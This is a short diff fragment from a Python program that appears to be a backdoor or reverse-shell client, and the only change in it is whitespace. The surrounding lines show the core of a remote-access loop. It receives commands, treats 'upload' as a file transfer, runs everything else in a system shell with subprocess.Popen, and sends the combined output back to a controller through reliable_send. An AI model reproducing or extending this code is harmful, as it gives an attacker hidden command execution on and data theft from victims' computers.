@@ -68,7 +68,7 @@ def shell():
         elif command[:6] == 'upload':
             download_file(command[7:])
         else:
-            execute = subprocess.Popen(command, shell=True, stdin=subprocess.PIPE , stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+            execute = subprocess.Popen(command, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
             result = execute.stdout.read() + execute.stderr.read()
             result = result.decode()
             reliable_send(result)
